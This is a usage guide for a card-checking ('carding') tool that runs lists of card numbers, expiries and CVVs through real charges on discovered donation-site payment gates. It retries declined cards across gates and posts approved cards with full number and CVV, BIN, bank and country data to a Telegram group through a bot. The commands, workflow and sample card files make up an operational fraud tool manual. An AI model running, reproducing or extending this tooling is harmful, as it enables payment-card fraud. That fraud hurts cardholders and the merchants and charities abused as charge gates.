# Telegram Integration - Usage Guide

## 🎉 New Features Added

### 1. **Telegram Bot Notifications** 📱
- Automatically posts successful charges to your Telegram group
- Beautiful formatted messages with card info, BIN data, and timestamps
- Real-time notifications as cards are approved

### 2. **Card File Loading** 📄
- Load cards from a text file instead of manual input
- Supports comments and empty lines
- Easy to manage large card lists

### 3. **Smart Retry Logic** 🔄
- If a card fails on one gate, automatically tries it on the next gate
- Keeps trying until the card succeeds or all gates are exhausted
- No more wasted cards!

### 4. **BIN Lookup** 🔍
- Automatically looks up card information
- Shows card type (VISA, Mastercard, etc.)
- Shows card level (3D, 3DS, 2D)
- Shows bank name and country with flag emoji

---

## 📋 Setup Instructions

### Step 1: Create Telegram Bot

1. **Open Telegram** and search for `@BotFather`
2. **Send** `/newbot` command
3. **Follow prompts** to create your bot
4. **Copy the bot token** (looks like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

### Step 2: Get Group ID

1. **Add your bot** to your Telegram group
2. **Make the bot an admin** (required to post messages)
3. **Send a message** in the group
4. **Visit** `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
5. **Find the chat ID** in the JSON response (looks like: `-1001234567890`)

### Step 3: Create Configuration File

Create `telegram_config.json`:

```json
{
  "bot_token": "YOUR_BOT_TOKEN_HERE",
  "group_id": "YOUR_GROUP_ID_HERE",
  "bot_credit": "@MissNullMe"
}
```

**Example:**
```json
{
  "bot_token": "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",
  "group_id": "-1001234567890",
  "bot_credit": "@MissNullMe"
}
```

### Step 4: Create Cards File

Create `cards.txt`:

```
# My cards for testing
# Format: number|month|year|cvv

5196032132860996|12|25|406
4532015112830366|11|26|789
5425233430109903|10|27|123
```

**Tips:**
- Lines starting with `#` are comments (ignored)
- Empty lines are ignored
- One card per line
- Format: `number|month|year|cvv`

---

## 🚀 Usage

### Basic Usage (No Telegram)

```bash
cd /home/null/Desktop/Stripeify

# Start ChromeDriver
chromedriver --port=9515 &

# Run checker (manual card input)
./target/release/shopify_checker test \
  --gates checker_results_working_gates.txt
```

### With Card File

```bash
./target/release/shopify_checker test \
  --gates checker_results_working_gates.txt \
  --cards-file cards.txt
```

### With Telegram Notifications

```bash
./target/release/shopify_checker test \
  --gates checker_results_working_gates.txt \
  --cards-file cards.txt \
  --telegram-config telegram_config.json
```

### Complete Example

```bash
# 1. Navigate to project
cd /home/null/Desktop/Stripeify

# 2. Start ChromeDriver
chromedriver --port=9515 &

# 3. Run with all features
./target/release/shopify_checker test \
  --gates checker_results_working_gates.txt \
  --cards-file cards.txt \
  --telegram-config telegram_config.json

# 4. Stop ChromeDriver when done
pkill chromedriver
```

---

## 📊 Telegram Message Format

When a card is approved, you'll receive a message like this:

```
✅ APPROVED
━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ⇾ 5196032132860996|12|25|406
[↯] 𝗚𝗔𝗧𝗘: Stripe Charge $35.00
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: Full Success
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡: 519603
[↯] 𝗜𝗡𝗙𝗢: VISA DEBIT 3DS
[↯] 𝗕𝗔𝗡𝗞: TD BANK
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: CANADA 🇨🇦
━━━━━━━━━━━━━━━━
[↯] 𝗧𝗜𝗠𝗘: 2024-12-21 15:30:45 EST
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ @MissNullMe
```

---

## 🔄 Smart Retry Logic

### How It Works

**Old Behavior:**
```
Card 1 → Gate 1 → DECLINED → Move to next card ❌
Card 2 → Gate 1 → DECLINED → Move to next card ❌
```

**New Behavior (Smart Retry):**
```
Card 1 → Gate 1 → DECLINED → Try Gate 2
Card 1 → Gate 2 → DECLINED → Try Gate 3
Card 1 → Gate 3 → CHARGED! ✅ → Post to Telegram → Move to next card

Card 2 → Gate 1 → CHARGED! ✅ → Post to Telegram → Move to next card
```

### Benefits

- **No wasted cards** - Every card gets tried on multiple gates
- **Higher success rate** - More chances for each card to succeed
- **Efficient** - Stops trying once card succeeds
- **Automatic** - No manual intervention needed

---

## 📁 File Structure

```
/home/null/Desktop/Stripeify/
├── telegram_config.json          # Your Telegram config
├── cards.txt                      # Your cards to test
├── checker_results_working_gates.txt  # Working gates from previous run
├── checker_results.json           # All test results
├── checker_results_working_gates.json # Working gates (JSON)
└── checker_results_working_gates.txt  # Working gates (text)
```

---

## 🎯 Complete Workflow

### 1. Find Donation Sites

```bash
./target/release/shopify_checker analyze --concurrent --workers 10
# Output: donation_gates.json
```

### 2. Test Cards (First Time)

```bash
chromedriver --port=9515 &
./target/release/shopify_checker test --gates donation_gates.json
# Output: checker_results_working_gates.txt
```

### 3. Use Working Gates with Telegram

```bash
# Create your config files
nano telegram_config.json  # Add your bot token and group ID
nano cards.txt             # Add your cards

# Run with Telegram
./target/release/shopify_checker test \
  --gates checker_results_working_gates.txt \
  --cards-file cards.txt \
  --telegram-config telegram_config.json
```

---

## ⚠️ Troubleshooting

### Telegram Not Working

**Problem:** "Failed to send Telegram notification"

**Solutions:**
1. Check bot token is correct
2. Verify group ID is correct (should start with `-`)
3. Make sure bot is admin in the group
4. Test bot manually: `https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<GROUP_ID>&text=Test`

### BIN Lookup Fails

**Problem:** Shows "UNKNOWN" for card info

**Solutions:**
1. Check internet connection
2. BIN API might be rate-limited (wait a few minutes)
3. Card BIN might not be in database (normal for some cards)

### Cards File Not Loading

**Problem:** "No valid cards found in file"

**Solutions:**
1. Check file format: `number|month|year|cvv`
2. Make sure no extra spaces
3. Verify file exists: `ls -la cards.txt`
4. Check file permissions: `chmod 644 cards.txt`

---

## 🔒 Security Notes

1. **Keep config files private** - Never share your bot token
2. **Use .gitignore** - Don't commit sensitive files
3. **Secure your bot** - Only add to private groups
4. **Rotate tokens** - Change bot token if compromised

---

## 📝 Example Files

### telegram_config.json.example
```json
{
  "bot_token": "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz-REPLACE_ME",
  "group_id": "-1001234567890",
  "bot_credit": "@MissNullMe"
}
```

### cards.txt.example
```
# Example cards file
# Format: number|month|year|cvv
# One card per line
# Lines starting with # are comments

5196032132860996|12|25|406
4532015112830366|11|26|789
5425233430109903|10|27|123
```

---

## 🎉 Success!

You're now ready to use the Telegram integration! Your approved cards will automatically post to your Telegram group with full details.

**Happy checking!** 🚀
